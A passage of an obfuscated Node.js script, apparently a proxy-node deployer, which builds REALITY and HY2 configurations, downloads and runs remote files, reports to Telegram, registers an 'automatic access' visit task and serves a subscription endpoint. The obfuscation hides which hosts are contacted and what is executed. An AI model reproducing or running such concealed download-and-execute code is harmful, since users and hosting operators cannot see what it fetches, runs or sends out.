    console[_0x3ed327(0x1f1)](_0x3ed327(0x239), _0x4299e5[_0x3ed327(0x28b)])
  }
}
async function AddVisitTask() {
  const _0x4b3332 = { _0x2976d0: 0x1e1, _0x2a4a69: 0x1f1, _0x19d2e4: 0x271 },
    _0x146adc = _0x4f0683
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console['log'](_0x146adc(0x2eb))
    return
  }
  try {
    const _0x52ac87 = await axios[_0x146adc(0x251)](_0x146adc(0x2b3), { url: PROJECT_URL }, { headers: { 'Content-Type': 'application/json' } })
    return (console[_0x146adc(_0x4b3332._0x2976d0)]('automatic\x20access\x20task\x20added\x20successfully'), _0x52ac87)
  } catch (_0x346d07) {
    return (console[_0x146adc(_0x4b3332._0x2a4a69)](_0x146adc(_0x4b3332._0x19d2e4) + _0x346d07[_0x146adc(0x28b)]), null)
  }
}
async function startserver() {
  const _0x54a70e = { _0x156dd2: 0x2bf },
    _0x45131d = _0x4f0683
  try {
    ;(argoType(),
      deleteNodes(),
      cleanupOldFiles(),
      isValidPort(REALITY_PORT) && generateOrLoadKeyPair(),
      isValidPort(HY2_PORT) && ensureTlsCertificates(certPath, keyPath),
      await generateConfig(),
      await downloadFilesAndRun(),
      await extractDomains(),
      await sendTelegram(),
      await AddVisitTask())
  } catch (_0x5885b8) {
    console[_0x45131d(0x1f1)](_0x45131d(_0x54a70e._0x156dd2), _0x5885b8)
  }
}
startserver()[_0x4f0683(0x20c)]((_0x2abbaa) => {
  const _0x5c5c3e = _0x4f0683
  console[_0x5c5c3e(0x1f1)](_0x5c5c3e(0x2cd), _0x2abbaa)
})
const server = http[_0x4f0683(0x1d9)](async (_0x2500f9, _0x5dad9c) => {
  const _0x772dfc = {
      _0x39224: 0x28f,
      _0x156536: 0x2b9,
      _0x59dbad: 0x225,
      _0x1c979b: 0x284,
      _0x1b8e3f: 0x204,
      _0x1d5fc9: 0x2e1,
      _0x30b523: 0x25a,
      _0xac850c: 0x28f,
      _0x16539f: 0x2c8,
      _0x382312: 0x2bc,
      _0x29b78f: 0x28f,
      _0x4c0073: 0x270
    },
    _0x2b89f6 = _0x4f0683,
    _0x4f5497 = _0x2500f9[_0x2b89f6(0x296)][_0x2b89f6(0x210)]('?')[0x0]
  if (_0x4f5497 === '/' + SUB_PATH) {
    if (subContent) (_0x5dad9c['writeHead'](0xc8, { 'Content-Type': _0x2b89f6(0x2bc) }), _0x5dad9c[_0x2b89f6(0x28f)](subContent))
    else
      try {
        const _0x143b47 = fs[_0x2b89f6(0x277)](subPath, _0x2b89f6(0x2c2))
        ;(_0x5dad9c[_0x2b89f6(0x2e1)](0xc8, { 'Content-Type': _0x2b89f6(0x2bc) }), _0x5dad9c[_0x2b89f6(0x28f)](_0x143b47))
      } catch (_0xe24d5) {
        ;(_0x5dad9c[_0x2b89f6(0x2e1)](0x1f7, { 'Content-Type': _0x2b89f6(0x2bc) }),
          _0x5dad9c[_0x2b89f6(_0x772dfc._0x39224)](_0x2b89f6(_0x772dfc._0x156536)))
      }
    return
  }
  if (_0x4f5497 === '/') {
    try {
      const _0x343683 = path['join'](__dirname, _0x2b89f6(_0x772dfc._0x59dbad)),
        _0x129d5e = await fs[_0x2b89f6(0x1f9)][_0x2b89f6(_0x772dfc._0x1c979b)](_0x343683, _0x2b89f6(_0x772dfc._0x1b8e3f))
      ;(_0x5dad9c[_0x2b89f6(_0x772dfc._0x1d5fc9)](0xc8, { 'Content-Type': _0x2b89f6(_0x772dfc._0x30b523) }),
        _0x5dad9c[_0x2b89f6(_0x772dfc._0xac850c)](_0x129d5e))
    } catch (_0x4e6a88) {
      ;(_0x5dad9c[_0x2b89f6(_0x772dfc._0x1d5fc9)](0xc8, { 'Content-Type': _0x2b89f6(0x25a) }),
        _0x5dad9c[_0x2b89f6(0x28f)](_0x2b89f6(_0x772dfc._0x16539f)))
    }
    return
  }
  ;(_0x5dad9c[_0x2b89f6(0x2e1)](0x194, { 'Content-Type': _0x2b89f6(_0x772dfc._0x382312) }),
    _0x5dad9c[_0x2b89f6(_0x772dfc._0x29b78f)](_0x2b89f6(_0x772dfc._0x4c0073)))
})
server[_0x4f0683(0x22e)](PORT, () => alwaysLog('http\x20server\x20is\x20running\x20on\x20' + PORT + '!'))
